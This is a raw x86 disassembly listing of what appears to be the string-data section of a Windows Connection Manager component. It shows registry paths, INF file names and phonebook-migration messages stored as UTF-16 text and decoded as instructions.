  4032a9:	add    BYTE PTR [edx+0x0],dh
  4032ac:	add    BYTE PTR gs:0x68007300,ch
  4032b3:	add    BYTE PTR [ecx+0x0],ah
  4032b6:	jb     0x4032b8
  4032b8:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4032bd:	add    BYTE PTR [ebx+0x0],ch
  4032c0:	add    BYTE PTR gs:[ecx+0x0],bh
  4032c4:	and    BYTE PTR [eax],al
  4032c6:	imul   eax,DWORD PTR [eax],0x200073
  4032cc:	add    BYTE PTR gs:[esi+0x0],ch
  4032d0:	arpl   WORD PTR [eax],ax
  4032d2:	jb     0x4032d4
  4032d4:	jns    0x4032d6
  4032d6:	jo     0x4032d8
  4032d8:	je     0x4032da
  4032da:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4032df:	add    BYTE PTR ds:0x5c007300,ah
  4032e5:	add    BYTE PTR ds:0x5c007300,ah
  4032eb:	add    BYTE PTR [edx],ch
  4032ed:	add    BYTE PTR [eax],al
  4032ef:	add    BYTE PTR [esi],ch
  4032f1:	add    BYTE PTR [ebx+0x0],ah
  4032f4:	add    BYTE PTR gs:[edx+0x0],dh
  4032f8:	add    BYTE PTR [eax],al
  4032fa:	add    BYTE PTR [eax],al
  4032fc:	and    eax,0x5c007300
  403301:	add    BYTE PTR ds:0x5c007300,ah
  403307:	add    BYTE PTR ds:0x7300,ah
  40330d:	add    BYTE PTR [eax],al
  40330f:	add    BYTE PTR [edi],ch
  403311:	add    BYTE PTR [ebx+0x0],ch
  403314:	and    BYTE PTR [eax],al
  403316:	arpl   WORD PTR [eax],ax
  403318:	add    BYTE PTR gs:[edx+0x0],dh
  40331c:	je     0x40331e
  40331e:	jne    0x403320
  403320:	je     0x403322
  403322:	imul   eax,DWORD PTR [eax],0x2e006c
  403328:	add    BYTE PTR gs:[eax+0x0],bh
  40332c:	add    BYTE PTR gs:[eax],ah
  40332f:	add    BYTE PTR ds:0x20006600,ch
  403335:	add    BYTE PTR ds:0x6e006500,ch
  40333b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40333f:	add    BYTE PTR [edx+0x0],dh
  403342:	jo     0x403344
  403344:	jb     0x403346
  403346:	imul   eax,DWORD PTR [eax],0x650073
  40334c:	and    BYTE PTR [eax],al
  40334e:	sub    eax,0x20007600
  403353:	add    BYTE PTR ds:0x64006100,ch
  403359:	add    BYTE PTR [eax+eax*1+0x73],ah
  40335d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  403361:	add    BYTE PTR [edx+0x0],dh
  403364:	add    BYTE PTR gs:[eax],ah
  403367:	add    BYTE PTR [edx+0x0],dl
  40336a:	outs   dx,DWORD PTR ds:[esi]
  40336b:	add    BYTE PTR [edi+0x0],ch
  40336e:	je     0x403370
  403370:	and    BYTE PTR [eax],al
  403372:	and    al,BYTE PTR [eax]
  403374:	and    eax,0x22007300
  403379:	add    BYTE PTR [eax],al
  40337b:	add    BYTE PTR [ebx+0x0],ah
  40337e:	ins    DWORD PTR es:[edi],dx
  40337f:	add    BYTE PTR [eax+eax*1+0x2e],ah
  403383:	add    BYTE PTR [ebp+0x0],ah
  403386:	js     0x403388
  403388:	add    BYTE PTR gs:[eax],al
  40338b:	add    BYTE PTR [esi+0x0],cl
  40338e:	inc    ebx
  40338f:	add    BYTE PTR [edi+0x0],bl
  403392:	dec    esi
  403393:	add    BYTE PTR [ebp+0x0],ah
  403396:	ja     0x403398
  403398:	inc    ebx
  403399:	add    BYTE PTR [edi+0x0],ch
  40339c:	outs   dx,BYTE PTR ds:[esi]
  40339d:	add    BYTE PTR [esi+0x0],ch
  4033a0:	add    BYTE PTR gs:[ebx+0x0],ah
  4033a4:	je     0x4033a6
  4033a6:	imul   eax,DWORD PTR [eax],0x6e006f
  4033ac:	push   edi
  4033ad:	add    BYTE PTR [ecx+0x0],ch
  4033b0:	jp     0x4033b2
  4033b2:	popa   
  4033b3:	add    BYTE PTR [edx+0x0],dh
  4033b6:	add    BYTE PTR fs:[eax],al
  4033b9:	add    BYTE PTR [eax],al
  4033bb:	add    BYTE PTR [eax],al
  4033bd:	add    BYTE PTR [eax],al
  4033bf:	add    BYTE PTR [ebx+0x0],dl
  4033c2:	outs   dx,DWORD PTR ds:[esi]
  4033c3:	add    BYTE PTR [esi+0x0],ah
  4033c6:	je     0x4033c8
  4033c8:	ja     0x4033ca
  4033ca:	popa   
  4033cb:	add    BYTE PTR [edx+0x0],dh
  4033ce:	add    BYTE PTR gs:[eax+eax*1+0x50],bl
  4033d3:	add    BYTE PTR [edi+0x0],ch
  4033d6:	ins    BYTE PTR es:[edi],dx
  4033d7:	add    BYTE PTR [ecx+0x0],ch
  4033da:	arpl   WORD PTR [eax],ax
  4033dc:	imul   eax,DWORD PTR [eax],0x730065
  4033e2:	pop    esp
  4033e3:	add    BYTE PTR [ebp+0x0],cl
  4033e6:	imul   eax,DWORD PTR [eax],0x720063
  4033ec:	outs   dx,DWORD PTR ds:[esi]
  4033ed:	add    BYTE PTR [ebx+0x0],dh
  4033f0:	outs   dx,DWORD PTR ds:[esi]
  4033f1:	add    BYTE PTR [esi+0x0],ah
  4033f4:	je     0x4033f6
  4033f6:	pop    esp
  4033f7:	add    BYTE PTR [edi+0x0],dl
  4033fa:	imul   eax,DWORD PTR [eax],0x64006e
  403400:	outs   dx,DWORD PTR ds:[esi]
  403401:	add    BYTE PTR [edi+0x0],dh
  403404:	jae    0x403406
  403406:	pop    esp
  403407:	add    BYTE PTR [esi+0x0],cl
  40340a:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  40340f:	add    BYTE PTR [edi+0x0],ch
  403412:	jb     0x403414
  403414:	imul   eax,DWORD PTR [eax],0x20
  403417:	add    BYTE PTR [ebx+0x0],al
  40341a:	outs   dx,DWORD PTR ds:[esi]
  40341b:	add    BYTE PTR [esi+0x0],ch
  40341e:	outs   dx,BYTE PTR ds:[esi]
  40341f:	add    BYTE PTR [ebp+0x0],ah
  403422:	arpl   WORD PTR [eax],ax
  403424:	je     0x403426
  403426:	imul   eax,DWORD PTR [eax],0x6e006f
  40342c:	jae    0x40342e
  40342e:	add    BYTE PTR [eax],al
  403430:	and    eax,0x5c007300
  403435:	add    BYTE PTR ds:0x5c007300,ah
  40343b:	add    BYTE PTR ds:0x2e007300,ah
  403441:	add    BYTE PTR [ebx+0x0],ah
  403444:	ins    DWORD PTR es:[edi],dx
  403445:	add    BYTE PTR [ebx+0x0],dh
  403448:	add    BYTE PTR [eax],al
  40344a:	add    BYTE PTR [eax],al
  40344c:	and    eax,0x5c007300
  403451:	add    BYTE PTR ds:0x7300,ah
  403457:	add    BYTE PTR [eax+0x0],bl
  40345a:	outs   dx,BYTE PTR ds:[esi]
  40345b:	add    BYTE PTR [ebx+0x0],dh
  40345e:	je     0x403460
  403460:	popa   
  403461:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403465:	add    BYTE PTR [edi+0x0],bl
  403468:	inc    ecx
  403469:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40346d:	add    BYTE PTR [ebp+0x0],dl
  403470:	jae    0x403472
  403472:	add    BYTE PTR gs:[edx+0x0],dh
  403476:	add    BYTE PTR [eax],al
  403478:	inc    esp
  403479:	add    BYTE PTR [ebp+0x0],ah
  40347c:	data16 add BYTE PTR [ecx+0x0],ah
  403480:	jne    0x403482
  403482:	ins    BYTE PTR es:[edi],dx
  403483:	add    BYTE PTR [eax+eax*1+0x49],dh
  403487:	add    BYTE PTR [esi+0x0],ch
  40348a:	jae    0x40348c
  40348c:	je     0x40348e
  40348e:	popa   
  40348f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403493:	add    BYTE PTR [edi+0x0],bl
  403496:	push   ebx
  403497:	add    BYTE PTR [ecx+0x0],ch
  40349a:	outs   dx,BYTE PTR ds:[esi]
  40349b:	add    BYTE PTR [edi+0x0],ah
  40349e:	ins    BYTE PTR es:[edi],dx
  40349f:	add    BYTE PTR [ebp+0x0],ah
  4034a2:	push   ebp
  4034a3:	add    BYTE PTR [ebx+0x0],dh
  4034a6:	add    BYTE PTR gs:[edx+0x0],dh
  4034aa:	add    BYTE PTR [eax],al
  4034ac:	pop    eax
  4034ad:	add    BYTE PTR [esi+0x0],ch
  4034b0:	jae    0x4034b2
  4034b2:	je     0x4034b4
  4034b4:	popa   
  4034b5:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4034b9:	add    BYTE PTR [edi+0x0],bl
  4034bc:	push   eax
  4034bd:	add    BYTE PTR [edx+0x0],dh
  4034c0:	imul   eax,DWORD PTR [eax],0x610076
  4034c6:	je     0x4034c8
  4034c8:	add    BYTE PTR gs:[eax],al
  4034cb:	add    BYTE PTR ds:0x63007300,ah
  4034d1:	add    BYTE PTR [ebp+0x0],ch
  4034d4:	bound  eax,QWORD PTR [eax]
  4034d6:	imul   eax,DWORD PTR [eax],0x73006e
  4034dc:	pop    esp
  4034dd:	add    BYTE PTR [eax],al
  4034df:	add    BYTE PTR [ebx+0x0],ah
  4034e2:	ins    DWORD PTR es:[edi],dx
  4034e3:	add    BYTE PTR [ebp+0x0],ah
  4034e6:	js     0x4034e8
  4034e8:	arpl   WORD PTR [eax],ax
  4034ea:	add    BYTE PTR gs:[eax+0x0],dh
  4034ee:	je     0x4034f0
  4034f0:	add    BYTE PTR cs:[ebx+0x0],ah
  4034f4:	popa   
  4034f5:	add    BYTE PTR [eax+eax*1+0x0],dh
  4034f9:	add    BYTE PTR [eax],al
  4034fb:	add    BYTE PTR [eax+0x0],dl
  4034fe:	outs   dx,DWORD PTR ds:[esi]
  4034ff:	add    BYTE PTR [ebx+0x0],dh
  403502:	je     0x403504
  403504:	dec    ecx
  403505:	add    BYTE PTR [esi+0x0],ch
  403508:	jae    0x40350a
  40350a:	je     0x40350c
  40350c:	popa   
  40350d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403511:	add    BYTE PTR [eax],al
  403513:	add    BYTE PTR [eax+0x0],dl
  403516:	outs   dx,DWORD PTR ds:[esi]
  403517:	add    BYTE PTR [ebx+0x0],dh
  40351a:	je     0x40351c
  40351c:	dec    ecx
  40351d:	add    BYTE PTR [esi+0x0],ch
  403520:	jae    0x403522
  403522:	je     0x403524
  403524:	popa   
  403525:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403529:	add    BYTE PTR [edi+0x0],bl
  40352c:	push   ebx
  40352d:	add    BYTE PTR [ecx+0x0],ch
  403530:	outs   dx,BYTE PTR ds:[esi]
  403531:	add    BYTE PTR [edi+0x0],ah
  403534:	ins    BYTE PTR es:[edi],dx
  403535:	add    BYTE PTR [ebp+0x0],ah
  403538:	add    BYTE PTR [eax],al
  40353a:	add    BYTE PTR [eax],al
  40353c:	push   esp
  40353d:	std    
  40353e:	mov    ch,BYTE PTR [esi+0x49615b57]
  403544:	mov    bl,BYTE PTR [ebx+0x3bf2ad12]
  40354a:	imul   ebp,DWORD PTR [edx+0x29],0xb86ef07f
  403551:	stc    
  403552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403553:	dec    ebp
  403554:	mov    ch,0x9e
  403556:	adc    ebx,esi
  403558:	mov    al,ds:0xf960ad60
  40355d:	(bad)  
  40355e:	pop    edi
  40355f:	ds push ecx
  403561:	call   0x20a1:0x63904367
  403568:	and    al,0x4f
  40356a:	mov    esi,0xdd6d74c7
  40356f:	outs   dx,BYTE PTR ds:[esi]
  403570:	pop    es
  403571:	shl    BYTE PTR [ebp+0x4e],0xb7
  403575:	push   0xffffffe5
  403577:	je     0x403582
  403579:	xchg   ebp,eax
  40357a:	loop   0x4035c8
  40357c:	add    BYTE PTR [eax],al
  40357e:	add    BYTE PTR [eax],al
  403580:	cmp    al,BYTE PTR [eax]
  403582:	cmp    al,BYTE PTR [eax]
  403584:	jnp    0x403586
  403586:	xor    al,BYTE PTR [eax]
  403588:	xor    DWORD PTR [eax],eax
  40358a:	inc    ebp
  40358b:	add    BYTE PTR [ebx+0x0],al
  40358e:	xor    al,BYTE PTR [eax]
  403590:	xor    BYTE PTR [eax],al
  403592:	xor    al,BYTE PTR [eax]
  403594:	xor    BYTE PTR [eax],al
  403596:	sub    eax,0x41003300
  40359b:	add    BYTE PTR [ebp+0x0],al
  40359e:	inc    ecx
  40359f:	add    BYTE PTR ds:0x30003100,ch
  4035a5:	add    BYTE PTR [esi],dh
  4035a7:	add    BYTE PTR [ecx],bh
  4035a9:	add    BYTE PTR ds:0x32004100,ch
  4035af:	add    BYTE PTR [eax+eax*1+0x44],al
  4035b3:	add    BYTE PTR ds:0x38003000,ch
  4035b9:	add    BYTE PTR [eax],dh
  4035bb:	add    BYTE PTR [eax],dh
  4035bd:	add    BYTE PTR [edx],dh
  4035bf:	add    BYTE PTR [edx+0x0],al
  4035c2:	xor    eax,DWORD PTR [eax]
  4035c4:	xor    BYTE PTR [eax],al
  4035c6:	xor    eax,DWORD PTR [eax]
  4035c8:	xor    BYTE PTR [eax],al
  4035ca:	cmp    DWORD PTR [eax],eax
  4035cc:	inc    esp
  4035cd:	add    BYTE PTR [ebp+0x0],bh
  4035d0:	pop    esp
  4035d1:	add    BYTE PTR [edx],bh
  4035d3:	add    BYTE PTR [edx],bh
  4035d5:	add    BYTE PTR [ebx+0x0],bh
  4035d8:	aaa    
  4035d9:	add    BYTE PTR [eax],dh
  4035db:	add    BYTE PTR [eax],dh
  4035dd:	add    BYTE PTR [edi],dh
  4035df:	add    BYTE PTR [ecx+0x0],ah
  4035e2:	arpl   WORD PTR [eax],ax
  4035e4:	arpl   WORD PTR [eax],ax
  4035e6:	aaa    
  4035e7:	add    BYTE PTR ds:0x32003300,ch
  4035ed:	add    BYTE PTR [eax],dh
  4035ef:	add    BYTE PTR [edx],dh
  4035f1:	add    BYTE PTR ds:0x31003100,ch
  4035f7:	add    BYTE PTR [eax+eax*1+0x31],ah
  4035fb:	add    BYTE PTR ds:0x61006100,ch
  403601:	add    BYTE PTR [eax+eax*1+0x32],ah
  403605:	add    BYTE PTR ds:0x30003000,ch
  40360b:	add    BYTE PTR [eax],bh
  40360d:	add    BYTE PTR [eax],dh
  40360f:	add    BYTE PTR ds:0x63006600,dh
  403615:	add    BYTE PTR [ecx],dh
  403617:	add    BYTE PTR [edx],dh
  403619:	add    BYTE PTR [edi],dh
  40361b:	add    BYTE PTR [eax],dh
  40361d:	add    BYTE PTR [ebp+0x0],ah
  403620:	jge    0x403622
  403622:	add    BYTE PTR [eax],al
  403624:	data16 add BYTE PTR [edi+0x0],ch
  403628:	ins    BYTE PTR es:[edi],dx
  403629:	add    BYTE PTR [eax+eax*1+0x65],ah
  40362d:	add    BYTE PTR [edx+0x0],dh
  403630:	add    BYTE PTR [eax],al
  403632:	add    BYTE PTR [eax],al
  403634:	outs   dx,DWORD PTR ds:[esi]
  403635:	add    BYTE PTR [eax+0x0],dh
  403638:	add    BYTE PTR gs:[esi+0x0],ch
  40363c:	add    BYTE PTR [eax],al
  40363e:	add    BYTE PTR [eax],al
  403640:	inc    esp
  403641:	add    BYTE PTR [ebp+0x0],ah
  403644:	jae    0x403646
  403646:	imul   eax,DWORD PTR [eax],0x74
  403649:	add    BYTE PTR [edi+0x0],ch
  40364c:	jo     0x40364e
  40364e:	inc    edi
  40364f:	add    BYTE PTR [ebp+0x0],dl
  403652:	dec    ecx
  403653:	add    BYTE PTR [eax+eax*1+0x0],al
  403657:	add    BYTE PTR [eax+eax*1+0x52],bl
  40365b:	add    BYTE PTR [ecx+0x0],al
  40365e:	push   ebx
	...
  403667:	add    BYTE PTR [ebx+0x0],dl
  40366a:	dec    edi
  40366b:	add    BYTE PTR [esi+0x0],al
  40366e:	push   esp
  40366f:	add    BYTE PTR [edi+0x0],dl
  403672:	inc    ecx
  403673:	add    BYTE PTR [edx+0x0],dl
  403676:	inc    ebp
  403677:	add    BYTE PTR [eax+eax*1+0x4d],bl
  40367b:	add    BYTE PTR [ecx+0x0],ch
  40367e:	arpl   WORD PTR [eax],ax
  403680:	jb     0x403682
  403682:	outs   dx,DWORD PTR ds:[esi]
  403683:	add    BYTE PTR [ebx+0x0],dh
  403686:	outs   dx,DWORD PTR ds:[esi]
  403687:	add    BYTE PTR [esi+0x0],ah
  40368a:	je     0x40368c
  40368c:	pop    esp
  40368d:	add    BYTE PTR [edi+0x0],dl
  403690:	imul   eax,DWORD PTR [eax],0x64006e
  403696:	outs   dx,DWORD PTR ds:[esi]
  403697:	add    BYTE PTR [edi+0x0],dh
  40369a:	jae    0x40369c
  40369c:	pop    esp
  40369d:	add    BYTE PTR [ebx+0x0],al
  4036a0:	jne    0x4036a2
  4036a2:	jb     0x4036a4
  4036a4:	jb     0x4036a6
  4036a6:	add    BYTE PTR gs:[esi+0x0],ch
  4036aa:	je     0x4036ac
  4036ac:	push   esi
  4036ad:	add    BYTE PTR [ebp+0x0],ah
  4036b0:	jb     0x4036b2
  4036b2:	jae    0x4036b4
  4036b4:	imul   eax,DWORD PTR [eax],0x6e006f
  4036ba:	pop    esp
  4036bb:	add    BYTE PTR [ebp+0x0],ah
  4036be:	js     0x4036c0
  4036c0:	jo     0x4036c2
  4036c2:	ins    BYTE PTR es:[edi],dx
  4036c3:	add    BYTE PTR [edi+0x0],ch
  4036c6:	jb     0x4036c8
  4036c8:	add    BYTE PTR gs:[edx+0x0],dh
  4036cc:	pop    esp
  4036cd:	add    BYTE PTR [eax+eax*1+0x65],al
  4036d1:	add    BYTE PTR [ebx+0x0],dh
  4036d4:	imul   eax,DWORD PTR [eax],0x74
  4036d7:	add    BYTE PTR [edi+0x0],ch
  4036da:	jo     0x4036dc
  4036dc:	pop    esp
  4036dd:	add    BYTE PTR [esi+0x0],cl
  4036e0:	popa   
  4036e1:	add    BYTE PTR [ebp+0x0],ch
  4036e4:	add    BYTE PTR gs:[ebx+0x0],dl
  4036e8:	jo     0x4036ea
  4036ea:	popa   
  4036eb:	add    BYTE PTR [ebx+0x0],ah
  4036ee:	add    BYTE PTR gs:[eax],al
  4036f1:	add    BYTE PTR [eax],al
  4036f3:	add    BYTE PTR [eax],al
  4036f5:	add    BYTE PTR [eax],al
  4036f7:	add    BYTE PTR [ebx+0x0],dl
  4036fa:	dec    edi
  4036fb:	add    BYTE PTR [esi+0x0],al
  4036fe:	push   esp
  4036ff:	add    BYTE PTR [edi+0x0],dl
  403702:	inc    ecx
  403703:	add    BYTE PTR [edx+0x0],dl
  403706:	inc    ebp
  403707:	add    BYTE PTR [eax+eax*1+0x4d],bl
  40370b:	add    BYTE PTR [ecx+0x0],ch
  40370e:	arpl   WORD PTR [eax],ax
  403710:	jb     0x403712
  403712:	outs   dx,DWORD PTR ds:[esi]
  403713:	add    BYTE PTR [ebx+0x0],dh
  403716:	outs   dx,DWORD PTR ds:[esi]
  403717:	add    BYTE PTR [esi+0x0],ah
  40371a:	je     0x40371c
  40371c:	pop    esp
  40371d:	add    BYTE PTR [edi+0x0],dl
  403720:	imul   eax,DWORD PTR [eax],0x64006e
  403726:	outs   dx,DWORD PTR ds:[esi]
  403727:	add    BYTE PTR [edi+0x0],dh
  40372a:	jae    0x40372c
  40372c:	pop    esp
  40372d:	add    BYTE PTR [ebx+0x0],al
  403730:	jne    0x403732
  403732:	jb     0x403734
  403734:	jb     0x403736
  403736:	add    BYTE PTR gs:[esi+0x0],ch
  40373a:	je     0x40373c
  40373c:	push   esi
  40373d:	add    BYTE PTR [ebp+0x0],ah
  403740:	jb     0x403742
  403742:	jae    0x403744
  403744:	imul   eax,DWORD PTR [eax],0x6e006f
  40374a:	pop    esp
  40374b:	add    BYTE PTR [ebp+0x0],dl
  40374e:	outs   dx,BYTE PTR ds:[esi]
  40374f:	add    BYTE PTR [ecx+0x0],ch
  403752:	outs   dx,BYTE PTR ds:[esi]
  403753:	add    BYTE PTR [ebx+0x0],dh
  403756:	je     0x403758
  403758:	popa   
  403759:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40375d:	add    BYTE PTR [eax],al
  40375f:	add    BYTE PTR [esi],ch
  403761:	add    BYTE PTR [ecx+0x0],ch
  403764:	outs   dx,BYTE PTR ds:[esi]
  403765:	add    BYTE PTR [esi+0x0],ah
  403768:	add    BYTE PTR [eax],al
  40376a:	add    BYTE PTR [eax],al
  40376c:	and    eax,0x5c007300
  403771:	add    BYTE PTR ds:0x25007300,ah
  403777:	add    BYTE PTR [ebx+0x0],dh
  40377a:	add    BYTE PTR [eax],al
  40377c:	inc    ebx
  40377d:	add    BYTE PTR [eax+eax*1+0x53],cl
  403781:	add    BYTE PTR [ecx+0x0],cl
  403784:	inc    esp
  403785:	add    BYTE PTR [eax+eax*1+0x25],bl
  403789:	add    BYTE PTR [ebx+0x0],dh
  40378c:	add    BYTE PTR [eax],al
  40378e:	add    BYTE PTR [eax],al
  403790:	inc    ebx
  403791:	add    BYTE PTR [eax+eax*1+0x53],cl
  403795:	add    BYTE PTR [ecx+0x0],cl
  403798:	inc    esp
  403799:	add    BYTE PTR [eax+eax*1+0x25],bl
  40379d:	add    BYTE PTR [ebx+0x0],dh
  4037a0:	pop    esp
  4037a1:	add    BYTE PTR [ebx+0x0],dl
  4037a4:	push   0x6c006500
  4037a9:	add    BYTE PTR [eax+eax*1+0x5c],ch
  4037ad:	add    BYTE PTR [eax+eax*1+0x65],al
  4037b1:	add    BYTE PTR [eax+eax*1+0x65],ch
  4037b5:	add    BYTE PTR [eax+eax*1+0x65],dh
  4037b9:	add    BYTE PTR [eax],al
  4037bb:	add    BYTE PTR [ebp+0x0],dl
  4037be:	outs   dx,BYTE PTR ds:[esi]
  4037bf:	add    BYTE PTR [ecx+0x0],ch
  4037c2:	outs   dx,BYTE PTR ds:[esi]
  4037c3:	add    BYTE PTR [ebx+0x0],dh
  4037c6:	je     0x4037c8
  4037c8:	popa   
  4037c9:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4037cd:	add    BYTE PTR [ebx+0x0],dl
  4037d0:	je     0x4037d2
  4037d2:	jb     0x4037d4
  4037d4:	imul   eax,DWORD PTR [eax],0x67006e
  4037da:	add    BYTE PTR [eax],al
  4037dc:	inc    esp
  4037dd:	add    BYTE PTR [ecx+0x0],ch
  4037e0:	jae    0x4037e2
  4037e2:	jo     0x4037e4
  4037e4:	ins    BYTE PTR es:[edi],dx
  4037e5:	add    BYTE PTR [ecx+0x0],ah
  4037e8:	jns    0x4037ea
  4037ea:	dec    esi
  4037eb:	add    BYTE PTR [ecx+0x0],ah
  4037ee:	ins    DWORD PTR es:[edi],dx
  4037ef:	add    BYTE PTR [ebp+0x0],ah
  4037f2:	add    BYTE PTR [eax],al
  4037f4:	and    eax,0x25007300
  4037f9:	add    BYTE PTR [ebx+0x0],dh
  4037fc:	and    eax,0x5c007300
  403801:	add    BYTE PTR ds:0x25007300,ah
  403807:	add    BYTE PTR [ebx+0x0],dh
  40380a:	add    BYTE PTR [eax],al
  40380c:	and    eax,0x69007300
  403811:	add    BYTE PTR [esi+0x0],ch
  403814:	jae    0x403816
  403816:	je     0x403818
  403818:	arpl   WORD PTR [eax],ax
  40381a:	ins    DWORD PTR es:[edi],dx
  40381b:	add    BYTE PTR [esi],ch
  40381d:	add    BYTE PTR [ecx+0x0],ch
  403820:	outs   dx,BYTE PTR ds:[esi]
  403821:	add    BYTE PTR [esi+0x0],ah
  403824:	add    BYTE PTR [eax],al
  403826:	add    BYTE PTR [eax],al
  403828:	and    eax,0x72007300
  40382d:	add    BYTE PTR [ebp+0x0],ah
  403830:	ins    DWORD PTR es:[edi],dx
  403831:	add    BYTE PTR [edi+0x0],ch
  403834:	jbe    0x403836
  403836:	add    BYTE PTR gs:[ebx+0x0],ah
  40383a:	ins    DWORD PTR es:[edi],dx
  40383b:	add    BYTE PTR [esi],ch
  40383d:	add    BYTE PTR [ecx+0x0],ch
  403840:	outs   dx,BYTE PTR ds:[esi]
  403841:	add    BYTE PTR [esi+0x0],ah
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	dec    edi
  403849:	add    BYTE PTR [eax+eax*1+0x64],ch
  40384d:	add    BYTE PTR [eax+0x0],dl
  403850:	popa   
  403851:	add    BYTE PTR [eax+eax*1+0x68],dh
  403855:	add    BYTE PTR [eax],al
  403857:	add    BYTE PTR [edx+0x0],dl
  40385a:	add    BYTE PTR gs:[ebp+0x0],ch
  40385e:	outs   dx,DWORD PTR ds:[esi]
  40385f:	add    BYTE PTR [esi+0x0],dh
  403862:	add    BYTE PTR gs:[eax],al
  403865:	add    BYTE PTR [eax],al
  403867:	add    BYTE PTR [ebp+0x0],cl
  40386a:	imul   eax,DWORD PTR [eax],0x720067
  403870:	popa   
  403871:	add    BYTE PTR [eax+eax*1+0x65],dh
  403875:	add    BYTE PTR [eax+0x0],dl
  403878:	push   0x6e006f00
  40387d:	add    BYTE PTR [ebp+0x0],ah
  403880:	bound  eax,QWORD PTR [eax]
  403882:	outs   dx,DWORD PTR ds:[esi]
  403883:	add    BYTE PTR [edi+0x0],ch
  403886:	imul   eax,DWORD PTR [eax],0x45
  403889:	add    BYTE PTR [esi+0x0],ch
  40388c:	je     0x40388e
  40388e:	jb     0x403890
  403890:	jns    0x403892
  403892:	and    BYTE PTR [eax],al
  403894:	sub    eax,0x20002d00
  403899:	add    BYTE PTR [ebx+0x0],al
  40389c:	popa   
  40389d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4038a1:	add    BYTE PTR [ecx+0x0],ch
  4038a4:	outs   dx,BYTE PTR ds:[esi]
  4038a5:	add    BYTE PTR [edi+0x0],ah
  4038a8:	and    BYTE PTR [eax],al
  4038aa:	push   edx
  4038ab:	add    BYTE PTR [ebp+0x0],ah
  4038ae:	ins    DWORD PTR es:[edi],dx
  4038af:	add    BYTE PTR [edi+0x0],ch
  4038b2:	jbe    0x4038b4
  4038b4:	add    BYTE PTR gs:[eax+0x0],dl
  4038b8:	push   0x6e006f00
  4038bd:	add    BYTE PTR [ebp+0x0],ah
  4038c0:	bound  eax,QWORD PTR [eax]
  4038c2:	outs   dx,DWORD PTR ds:[esi]
  4038c3:	add    BYTE PTR [edi+0x0],ch
  4038c6:	imul   eax,DWORD PTR [eax],0x45
  4038c9:	add    BYTE PTR [esi+0x0],ch
  4038cc:	je     0x4038ce
  4038ce:	jb     0x4038d0
  4038d0:	jns    0x4038d2
  4038d2:	and    BYTE PTR [eax],al
  4038d4:	outs   dx,DWORD PTR ds:[esi]
  4038d5:	add    BYTE PTR [esi+0x0],ch
  4038d8:	and    BYTE PTR [eax],al
  4038da:	and    eax,0x20007300
  4038df:	add    BYTE PTR [ecx+0x0],ch
  4038e2:	outs   dx,BYTE PTR ds:[esi]
  4038e3:	add    BYTE PTR [eax],ah
  4038e5:	add    BYTE PTR [eax+0x0],dh
  4038e8:	push   0x6e006f00
  4038ed:	add    BYTE PTR [ebp+0x0],ah
  4038f0:	and    BYTE PTR [eax],al
  4038f2:	bound  eax,QWORD PTR [eax]
  4038f4:	outs   dx,DWORD PTR ds:[esi]
  4038f5:	add    BYTE PTR [edi+0x0],ch
  4038f8:	imul   eax,DWORD PTR [eax],0x20
  4038fb:	add    BYTE PTR ds:0x7300,ah
  403901:	add    BYTE PTR [eax],al
  403903:	add    BYTE PTR ds:0x25007300,ah
  403909:	add    BYTE PTR [ebx+0x0],dh
  40390c:	pop    esp
  40390d:	add    BYTE PTR ds:0x2e007300,ah
  403913:	add    BYTE PTR [ebx+0x0],ah
  403916:	ins    DWORD PTR es:[edi],dx
  403917:	add    BYTE PTR [ebx+0x0],dh
  40391a:	add    BYTE PTR [eax],al
  40391c:	dec    esi
  40391d:	add    BYTE PTR [edi+0x0],ch
  403920:	and    BYTE PTR [eax],al
  403922:	inc    ebx
  403923:	add    BYTE PTR [ebp+0x0],cl
  403926:	and    BYTE PTR [eax],al
  403928:	ins    DWORD PTR es:[edi],dx
  403929:	add    BYTE PTR [ecx+0x0],ah
  40392c:	jo     0x40392e
  40392e:	jo     0x403930
  403930:	imul   eax,DWORD PTR [eax],0x67006e
  403936:	jae    0x403938
  403938:	and    BYTE PTR [eax],al
  40393a:	imul   eax,DWORD PTR [eax],0x65
  40393d:	add    BYTE PTR [ecx+0x0],bh
  403940:	and    BYTE PTR [eax],al
  403942:	je     0x403944
  403944:	outs   dx,DWORD PTR ds:[esi]
  403945:	add    BYTE PTR [eax],ah
  403947:	add    BYTE PTR [ebp+0x0],ch
  40394a:	imul   eax,DWORD PTR [eax],0x720067
  403950:	popa   
  403951:	add    BYTE PTR [eax+eax*1+0x65],dh
  403955:	add    BYTE PTR [esi],ch
	...
  40395f:	add    BYTE PTR [ebp+0x0],cl
  403962:	imul   eax,DWORD PTR [eax],0x720067
  403968:	popa   
  403969:	add    BYTE PTR [eax+eax*1+0x65],dh
  40396d:	add    BYTE PTR [ebx+0x0],al
  403970:	ins    DWORD PTR es:[edi],dx
  403971:	add    BYTE PTR [eax+0x0],dl
  403974:	jb     0x403976
  403976:	outs   dx,DWORD PTR ds:[esi]
  403977:	add    BYTE PTR [esi+0x0],ah
  40397a:	imul   eax,DWORD PTR [eax],0x65006c
  403980:	jae    0x403982
  403982:	inc    esi
  403983:	add    BYTE PTR [edi+0x0],ch
  403986:	jb     0x403988
  403988:	push   edi
  403989:	add    BYTE PTR [ecx+0x0],ch
  40398c:	outs   dx,BYTE PTR ds:[esi]
  40398d:	add    BYTE PTR [edx],dh
  40398f:	add    BYTE PTR [ebx+0x0],ch
  403992:	push   ebp
  403993:	add    BYTE PTR [eax+0x0],dh
  403996:	add    BYTE PTR [bp+si+0x0],dh
  40399a:	popa   
  40399b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40399f:	add    BYTE PTR [eax],ah
  4039a1:	add    BYTE PTR ds:0x20002d00,ch
